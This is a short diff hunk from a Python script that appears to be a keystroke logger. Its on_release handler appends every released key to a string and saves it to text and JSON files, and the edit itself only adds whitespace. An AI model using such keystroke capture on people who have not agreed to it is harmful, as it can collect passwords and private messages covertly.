@@ -38,7 +38,7 @@ def on_release(key):
     if x == True:
         x = False
     update_json_file(key_list)
-
+    
     key_strokes = key_strokes + str(key)
     update_txt_file(str(key_strokes))
 
